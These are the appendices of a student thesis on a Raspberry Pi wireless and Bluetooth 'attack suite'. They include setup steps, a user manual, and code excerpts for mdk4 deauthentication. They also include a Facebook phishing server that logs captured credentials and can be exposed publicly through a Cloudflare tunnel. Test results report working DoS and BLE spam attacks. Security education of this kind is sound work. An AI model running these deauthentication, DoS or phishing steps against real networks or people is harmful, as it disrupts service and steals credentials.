# Appendices

---

## Appendix A: Hardware Setup Guide

### A.1 Required Hardware

| Component | Model | Purpose | Approximate Cost |
|-----------|-------|---------|-----------------|
| Single-Board Computer | Raspberry Pi Zero 2 W | Main platform | $15-20 |
| WiFi Adapter | TP-Link Archer T2U PLUS | Monitor mode WiFi | $30-40 |
| MicroSD Card | 32 GB Class 10 U3 | Operating system + storage | $8-12 |
| USB Hub | Powered USB 2.0/3.0 hub | Connect WiFi adapter | $10-15 |
| Power Supply | 5V/2A USB Micro-B | Power the Pi | $5-10 |
| **Total** | | | **~$68-97** |

**Optional components:**
- Aluminum heatsink case ($5-10) — prevents thermal throttling during sustained attacks
- USB Ethernet adapter ($10-15) — provides internet while WiFi is in monitor mode
- Portable battery pack ($15-25) — enables field deployment

### A.2 Raspberry Pi Zero 2 W Setup

**Step 1: Flash the operating system**
1. Download Raspberry Pi OS Lite (32-bit) from https://www.raspberrypi.com/software/
2. Use Raspberry Pi Imager to flash the OS to the MicroSD card
3. In Raspberry Pi Imager settings, configure:
   - Hostname (e.g., `attackpi`)
   - Enable SSH with password authentication
   - Set username and password
   - Configure WiFi for initial setup (built-in WiFi)
4. Insert the MicroSD card into the Pi and power on

**Step 2: Initial connection**
```bash
# Connect via SSH using the built-in WiFi
ssh username@attackpi.local

# Or use the IP address from your router's DHCP table
ssh username@192.168.x.x
```

**Step 3: Update the system**
```bash
sudo apt-get update && sudo apt-get upgrade -y
```

### A.3 WiFi Adapter Setup (TP-Link Archer T2U PLUS)

**Physical connection:**
1. Connect the TP-Link adapter to the powered USB hub
2. Connect the USB hub to the Pi's USB OTG port (micro-USB data port, NOT the power port)
3. The adapter should be recognized automatically (check with `lsusb`)

**Verify adapter recognition:**
```bash
lsusb | grep Realtek
# Expected output: Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
```

**Driver installation (see Appendix B, Step 3)**

### A.4 Monitor Mode Configuration

After the driver is installed and the Pi has been rebooted:

```bash
# Check available interfaces
iwconfig

# Unmanage the external adapter (prevent NetworkManager interference)
sudo nmcli device set wlan1 managed no

# Enable monitor mode
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up

# Verify monitor mode
iwconfig wlan1
# Should show: Mode:Monitor
```

**Important:** The interface name may vary. Use `iwconfig` to find the correct name for your external adapter (usually `wlan1` if the built-in WiFi is `wlan0`).

### A.5 Bluetooth Adapter Configuration

The Raspberry Pi Zero 2 W has a built-in Bluetooth 4.2 BLE adapter. No external adapter is needed for BLE attacks.

```bash
# Unblock Bluetooth
sudo rfkill unblock bluetooth

# Reset the adapter
sudo hciconfig hci0 reset

# Enable Bluetooth management
sudo btmgmt power on
sudo btmgmt connectable on
sudo btmgmt discov on
sudo btmgmt pairable on

# Verify adapter is active
hciconfig hci0
# Should show: UP RUNNING
```

### A.6 Thermal Management

The Pi Zero 2 W throttles its CPU at 80°C, which can happen during sustained WiFi attacks:

**Passive cooling (recommended):**
- Use an aluminum heatsink case that covers the CPU
- Provides adequate cooling for most attack durations

**Active cooling (optional):**
- Small 5V fan (30×30mm) attached to GPIO pins
- Prevents throttling during extended packet capture or flooding attacks

**Monitoring temperature:**
```bash
# Check CPU temperature
vcgencmd measure_temp
# Example output: temp=52.0'C
```

---

## Appendix B: Installation & Configuration

### Complete Installation Script

This is the full setup process from a fresh Raspberry Pi OS installation. All commands from SETUP.md are included with explanations.

### Step 1: System Packages

```bash
# Update package lists and upgrade existing packages
sudo apt-get update && sudo apt-get upgrade -y

# Python development environment
sudo apt-get install -y python3 python3-pip python3-dev

# Utilities for downloading and version control
sudo apt-get install -y git curl wget

# Bluetooth stack and development libraries
sudo apt-get install -y bluez bluez-tools
sudo apt-get install -y python3-bluez python3-dbus libbluetooth-dev

# WiFi security testing tools
sudo apt-get install -y aircrack-ng mdk4 wifite

# Network infrastructure tools
sudo apt-get install -y dnsmasq hostapd iptables

# Python BLE and configuration libraries
sudo apt install -y python3-bleak python3-yaml

# Network scanning and packet tools
sudo apt-get install -y arp-scan hping3
```

### Step 2: Initialize Bluetooth Adapter

```bash
# Unblock all radio devices
sudo rfkill list
sudo rfkill unblock bluetooth
sudo rfkill unblock all

# Reset and configure the Bluetooth adapter
sudo hciconfig hci0 reset
hciconfig hci0
sudo btmgmt power on
sudo btmgmt connectable on
sudo btmgmt discov on
sudo btmgmt pairable on
```

### Step 3: WiFi Adapter Driver Installation

```bash
# Install build dependencies
sudo apt-get update
sudo apt-get install -y git build-essential dkms bc linux-headers-generic

# Clone the RTL8821AU driver
cd ~
git clone https://github.com/morrownr/8821au-20210708.git
cd 8821au-20210708

# Run the automated installation script
sudo ./install-driver.sh

# Reboot to load the kernel module
sudo reboot
```

After reboot, enable monitor mode:
```bash
# Unmanage the external WiFi adapter
sudo nmcli device set wlan1 managed no

# Switch to monitor mode
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up

# Verify
iwconfig
```

### Step 4: Cloudflare Tunnel Setup (Optional)

Only needed if you plan to use the phishing modules with public access:

```bash
# Download cloudflared for ARM64
wget https://github.com/cloudflare/cloudflared/releases/download/2024.12.0/cloudflared-linux-arm64

# Make executable and install
chmod +x cloudflared-linux-arm64
sudo mv cloudflared-linux-arm64 /usr/local/bin/cloudflared

# Verify installation
cloudflared --version
```

### Step 5: Clone the Project

```bash
# Clone the project repository
cd ~
git clone <repository-url> personal_project
cd personal_project

# Run the application
sudo python3 main.py
```

### Troubleshooting

**Problem: WiFi adapter not detected after driver installation**
```bash
# Check if the adapter is physically connected
lsusb | grep Realtek

# Check if the driver module is loaded
lsmod | grep 8821au

# If not loaded, try manual loading
sudo modprobe 8821au
```

**Problem: Monitor mode fails to enable**
```bash
# Kill processes that may interfere
sudo airmon-ng check kill

# Try again
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
```

**Problem: Bluetooth adapter not found**
```bash
# Check if Bluetooth is blocked
sudo rfkill list

# Unblock if necessary
sudo rfkill unblock bluetooth

# Restart Bluetooth service
sudo systemctl restart bluetooth
```

**Problem: Permission denied errors**
```bash
# Most attacks require root privileges
sudo python3 main.py

# Or run specific commands with sudo
```

---

## Appendix C: Source Code

### C.1 Project File Structure

```
personal_project/
├── main.py                     # Main orchestrator (AttackSuite class, 976 lines)
├── SETUP.md                    # Installation instructions
├── SOURCES.md                  # Attribution documentation
│
├── ui/
│   ├── __init__.py             # UI module exports
│   └── console.py              # Color codes and output functions (101 lines)
│
├── wifi/
│   ├── __init__.py             # WiFi module exports
│   ├── beacon_broadcast.py     # Fake WiFi network creation (148 lines)
│   ├── ap_network_flood.py     # Mass network broadcasting (varies)
│   ├── network_scanner.py      # WiFi network discovery (varies)
│   ├── deauth_attack.py        # Client disconnection (281 lines)
│   ├── essid_bruteforce.py     # Hidden network enumeration (varies)
│   ├── packet_capture.py       # Traffic recording (varies)
│   ├── http_dos.py             # HTTP request flooding (190 lines)
│   ├── localdos.py             # Local network DoS (varies)
│   ├── ap_networks.txt         # Network name wordlist
│   └── common_ssids.txt        # Common SSID wordlist
│
├── ble/
│   ├── __init__.py             # BLE module exports
│   ├── device_scanner.py       # BLE device discovery (280 lines)
│   ├── airpods_spam.py         # Fake AirPods advertisements (216 lines)
│   ├── android_spam.py         # Fake Android advertisements (varies)
│   ├── ad_spam.py              # Fake Apple device advertisements (varies)
│   ├── name_spoofer.py         # Bluetooth name rotation (varies)
│   ├── bluetooth_utils.py      # Low-level HCI utilities (varies)
│   └── company_identifiers.yaml # BLE manufacturer database (197 KB)
│
├── bt/
│   ├── __init__.py             # Bluetooth Classic module exports
│   └── l2cap_dos_attack.py     # L2CAP connection flooding (171 lines)
│
├── phishing/
│   ├── __init__.py             # Phishing module exports
│   ├── facebook_phish.py       # Facebook login replica (509 lines)
│   └── google_phish.py         # Google login replica (varies)
│
└── docs/
    ├── chapter1.md             # Introduction
    ├── chapter2.md             # Domain Analysis
    ├── chapter3.md             # Technologies, Tools & Methods
    ├── chapter4.md             # Solution Architecture & Design
    ├── chapter5.md             # Implementation Details
    ├── chapter6.md             # Flipper Zero Comparison
    ├── chapter7.md             # Conclusions & Future Work
    ├── THESIS_CONTEXT.md       # Project context document
    └── THESIS_STRUCTURE_PROPOSAL.md  # Thesis structure outline
```

### C.2 Key Module: UI Console (console.py)

The complete console module that provides color-coded output for all attacks:

```python
# Terminal color codes and console utilities for styled output.

# Regular colors
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'

# Light/Bright colors
LIGHT_BLUE = '\033[94m'
LIGHT_CYAN = '\033[96m'

# Styles
RESET = '\033[0m'
BRIGHT = '\033[1m'
BOLD = '\033[1m'

def cprint(text, color=CYAN, end='\n'):
    """Print colored text."""
    print(f"{color}{text}{RESET}", end=end)

def iprint(text, end='\n'):
    """Print info message in light blue."""
    print(f"{LIGHT_BLUE}[INFO] {text}{RESET}", end=end)

def wprint(text, end='\n'):
    """Print warning message in yellow."""
    print(f"{YELLOW}[WARN] {text}{RESET}", end=end)

def eprint(text, end='\n'):
    """Print error message in red."""
    print(f"{RED}[ERROR] {text}{RESET}", end=end)

def sprint(text, end='\n'):
    """Print success message in green."""
    print(f"{GREEN}{text}{RESET}", end=end)

def cinput(prompt, color=LIGHT_CYAN):
    """Get colored input from user."""
    return input(f"{color}{prompt}{RESET} > ")

def clear():
    """Clear the terminal screen."""
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner(text, color=CYAN):
    """Print a centered banner with borders."""
    width = 60
    print(f"\n{color}{'='*width}")
    print(f"{text:^{width}}")
    print(f"{'='*width}{RESET}\n")
```

### C.3 Key Module: Deauthentication Attack (deauth_attack.py)

Representative WiFi attack module showing the subprocess integration pattern:

```python
class DeauthAttack:
    """Wireless deauthentication attack targeting networks and devices."""

    def __init__(self, interface):
        self.interface = interface
        self.process = None

    def verify_monitor_mode(self):
        """Verify that the interface is in monitor mode."""
        try:
            result = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True, text=True, timeout=5
            )
            return "Monitor" in result.stdout
        except Exception:
            return False

    def attack_by_ssid(self, ssid):
        """Deauth all devices on a network by SSID."""
        try:
            cmd = f"mdk4 {self.interface} d -E {ssid}"
            self.process = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True, bufsize=1
            )
            while self.process:
                output = self.process.stdout.readline()
                if output:
                    cprint(output.rstrip(), CYAN)
                if self.process.poll() is not None:
                    break
        except KeyboardInterrupt:
            self.stop_attack()
        finally:
            if self.process:
                self.process.terminate()

    def attack_by_device(self, target_mac, router_mac):
        """Deauth a specific device from a specific network."""
        cmd = f"mdk4 {self.interface} d -B {router_mac} -S {target_mac}"
        # Same subprocess pattern as attack_by_ssid
        ...
```

### C.4 Key Module: BLE Device Scanner (device_scanner.py)

Representative BLE attack module showing the async scanning pattern:

```python
class BLEDeviceScanner:
    """BLE device scanner with company identification and distance estimation."""

    def __init__(self):
        self.devices = {}  # {mac: {name, rssi, tx_power, company, ...}}
        self.company_ids = self._load_company_ids()

    def _load_company_ids(self):
        """Load BLE manufacturer company IDs from YAML file."""
        file_path = os.path.join(os.path.dirname(__file__), "company_identifiers.yaml")
        with open(file_path, 'r') as f:
            data = yaml.safe_load(f)
        # Parse entries into {company_id: company_name} dict
        ...

    def _calculate_distance(self, tx_power, rssi):
        """Estimate distance from TX power and RSSI using path loss model."""
        return math.pow(10.0, (tx_power - rssi) / (10 * 2))

    async def start_continuous_scan(self):
        """Continuous BLE scanning with real-time display."""
        from bleak import BleakScanner

        def detection_callback(device, advertisement_data):
            # Update self.devices with new/updated device info
            ...

        scanner = BleakScanner(detection_callback=detection_callback)
        async with scanner:
            while self.running:
                await asyncio.sleep(0.5)
                display_table()  # Refresh the device table

    def run(self):
        """Entry point."""
        asyncio.run(self.start_continuous_scan())
```

### C.5 Key Module: Facebook Phishing (facebook_phish.py)

Representative phishing module showing the HTTP server pattern:

```python
class FacebookPhishingHandler(BaseHTTPRequestHandler):
    """HTTP handler for fake login page."""

    def do_GET(self):
        """Serve the fake login page."""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(FACEBOOK_LOGIN_HTML.encode('utf-8'))

    def do_POST(self):
        """Capture submitted credentials."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = parse_qs(post_data)
        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]

        # Log credentials to file
        with open(log_file, 'a') as f:
            f.write(f"{timestamp} | {username} | {password}\n")

        # Redirect to real Facebook
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()

class FacebookPhishing:
    """Phishing server with Cloudflare Tunnel support."""

    def run_interactive(self):
        # Start HTTP server in background thread
        server_thread = threading.Thread(target=self.start_server, daemon=True)
        server_thread.start()

        # Optionally start Cloudflare Tunnel for public access
        if use_cloudflare:
            cmd = f"cloudflared tunnel --url http://127.0.0.1:{self.port}"
            self.tunnel_process = subprocess.Popen(cmd, shell=True, ...)
```

Full source code for all modules is available in the project repository.

---

## Appendix D: User Manual

### D.1 Starting the Application

```bash
# Navigate to the project directory
cd ~/personal_project

# Run with root privileges (required for most attacks)
sudo python3 main.py
```

The main menu appears:
```
╔════════════════════════════════════════════════════════╗
║                    MAIN MENU                           ║
╠════════════════════════════════════════════════════════╣
║  1) BLE Attacks      - Bluetooth Low Energy Tools      ║
║  2) Bluetooth Attacks - Bluetooth Classic Tools         ║
║  3) WiFi Attacks     - WiFi Network Spoofing Tools     ║
║  4) Phishing         - Social Engineering Tools        ║
║  5) About            - Project Information             ║
║  6) Exit             - Quit Application                ║
╚════════════════════════════════════════════════════════╝
```

### D.2 WiFi Attack Workflow

**Before running WiFi attacks:**
1. Connect the TP-Link WiFi adapter via USB hub
2. Enable monitor mode (see Appendix A.4)
3. Know your interface name (usually `wlan1` or `wlan1mon`)

**Example: Running a Deauthentication Attack**
1. Select `3) WiFi Attacks` from the main menu
2. Select `4) deauth - Deauthentication Attack`
3. Enter the WiFi interface name (e.g., `wlan1`)
4. Choose target type:
   - Network (ESSID) — disconnect all devices from a network by name
   - Router (BSSID) — disconnect all devices from a router by MAC address
   - Device (Station MAC) — disconnect a specific device
5. Enter the target identifier
6. The attack runs until you press Ctrl+C
7. Press Enter to return to the menu

**Example: Running a Network Scanner**
1. Select `3) WiFi Attacks` → `3) scanner`
2. Enter the interface name
3. The scanner runs airodump-ng and displays networks in real-time
4. Press Ctrl+C to stop

### D.3 BLE Attack Workflow

**Before running BLE attacks:**
1. Ensure Bluetooth is enabled (see Appendix A.5)
2. No external adapter needed (built-in BLE)

**Example: Running the BLE Device Scanner**
1. Select `1) BLE Attacks` → `5) scanner`
2. The scanner starts automatically
3. Devices appear in a real-time table with MAC, name, RSSI, company, and distance
4. Press Ctrl+C to stop

**Example: Running AirPods Spam**
1. Select `1) BLE Attacks` → `1) airpods`
2. Enter number of Bluetooth adapters (default: 1)
3. Enter advertising interval in ms (default: 200)
4. Enter duration in seconds (default: 60)
5. Enter number of AirPods models to spam (1-5, default: 5)
6. The attack broadcasts fake AirPods advertisements
7. Press Ctrl+C to stop early

### D.4 Phishing Workflow

**Example: Running Facebook Phishing with Cloudflare Tunnel**
1. Select `4) Phishing` → `1) facebook`
2. Enter port (default: 8000)
3. Choose hosting method: `2) Cloudflare Tunnel`
4. Wait for Cloudflare to generate a public URL
5. Copy the `https://something.trycloudflare.com` URL
6. Send the URL to the target (in a controlled test)
7. When credentials are entered, they appear in the terminal and are saved to a log file
8. Press Ctrl+C to stop the server

### D.5 Safety Considerations

**Legal requirements:**
- Only use this platform on networks and devices you own or have explicit written permission to test
- Unauthorized use of these tools may violate local, national, and international laws
- WiFi deauthentication attacks can disrupt legitimate communications
- Phishing attacks are illegal without authorization

**Best practices for educational use:**
- Use an isolated test network (not the production network)
- Inform all participants in the testing environment
- Keep logs of all testing activities
- Stop attacks immediately if unintended devices are affected
- Document all findings for educational purposes

---

## Appendix E: Test Results & Data

### E.1 Testing Environment

All attacks were tested in the following environment:
- **Platform:** Raspberry Pi Zero 2 W (512 MB RAM, ARM Cortex-A53)
- **WiFi Adapter:** TP-Link Archer T2U PLUS (RTL8821AU)
- **Target Network:** Personal WPA2 home network (2.4 GHz)
- **Target Devices:** Personal iPhone, Android phone, laptop
- **BLE Devices:** Various consumer BLE devices in range

### E.2 WiFi Attack Results

| Attack | Status | Observations |
|--------|--------|-------------|
| Beacon Broadcast | ✅ Working | Fake networks appear on nearby devices within 1-2 seconds |
| AP Network Flood | ✅ Working | Multiple fake networks broadcast simultaneously from wordlist |
| Network Scanner | ✅ Working | Discovers networks and clients in real-time using airodump-ng |
| Deauthentication | ✅ Working | Devices disconnect and reconnect; works on WPA2 networks |
| ESSID Bruteforce | ✅ Working | Successfully discovers hidden networks with common names |
| Packet Capture | ✅ Working | .cap files readable in Wireshark with proper frame data |
| HTTP DoS | ✅ Working | Sends requests successfully; limited impact on production servers |
| Local Network DoS | ✅ Working | Target iPhone froze within seconds; recovered on attack stop |

### E.3 BLE Attack Results

| Attack | Status | Observations |
|--------|--------|-------------|
| Device Scanner | ✅ Working | Discovers 10-30+ devices in typical indoor environment |
| AirPods Spam | ✅ Working | Triggers pairing popups on nearby iOS devices |
| Android Spam | ✅ Working | Generates advertisements visible to Android devices |
| Apple Ad Spam | ✅ Working | Triggers various Apple device notifications |
| Name Spoofer | ✅ Working | Device name changes visible in nearby Bluetooth scans |

### E.4 Other Attack Results

| Attack | Status | Observations |
|--------|--------|-------------|
| L2CAP DoS | ✅ Working | Sends L2CAP echo requests; modern devices rate-limit effectively |
| Facebook Phishing | ✅ Working | Login page serves correctly; credentials captured and logged |
| Google Phishing | ✅ Working | Login page serves correctly; Cloudflare Tunnel generates public URL |

### E.5 Performance Notes

- **CPU usage during WiFi attacks:** 15-40% (external tools handle the heavy processing)
- **CPU usage during BLE scanning:** 10-25% (bleak library is efficient)
- **CPU usage during HTTP DoS:** 60-80% (50 threads generating requests)
- **Memory usage:** 80-150 MB during typical operation (well within 512 MB limit)
- **Temperature:** 45-65°C during sustained attacks (below 80°C throttling threshold with passive cooling)

---

## Appendix F: Configuration Files

### F.1 SETUP.md

The complete setup instructions are included in the project repository at `personal_project/SETUP.md`. See Appendix B for the full installation walkthrough.

### F.2 company_identifiers.yaml

The BLE manufacturer database is a 197 KB YAML file containing thousands of Bluetooth SIG registered company identifiers. Format:

```yaml
company_identifiers:
  - value: '0x004C'
    name: 'Apple, Inc.'
  - value: '0x006B'
    name: 'Google LLC'
  - value: '0x0075'
    name: 'Samsung Electronics Co. Ltd.'
  - value: '0x0059'
    name: 'Nordic Semiconductor ASA'
  - value: '0x0006'
    name: 'Microsoft'
  # ... thousands more entries
```

This file is used by `ble/device_scanner.py` to identify the manufacturer of discovered BLE devices.

### F.3 WiFi Network Wordlists

**ap_networks.txt** — Network names used by the AP Network Flood attack:
```
FreeWiFi
Home Network
Guest Network
Office WiFi
Airport_Free_WiFi
Hotel_WiFi
Coffee_Shop
Public_WiFi
Starbucks_WiFi
# ... additional entries
```

**common_ssids.txt** — Common SSID names used by the ESSID Bruteforce attack:
```
linksys
default
netgear
dlink
Home
NETGEAR
belkin
ATT
xfinitywifi
XFINITY
# ... 75+ additional entries
```

### F.4 Example Credential Log Output

When the phishing server captures credentials, they are logged in the following format:

```
Facebook Phishing Log - 2026-06-10 15:30:45
================================================================================
Timestamp | IP Address | Username | Password
================================================================================
2026-06-10 15:31:12 | IP: 192.168.1.105 | Username: test@example.com | Password: testpassword123
2026-06-10 15:32:45 | IP: 192.168.1.108 | Username: user@demo.com | Password: demo2026
```

**Note:** These are example entries from controlled testing. The platform should never be used to capture real credentials without explicit authorization.
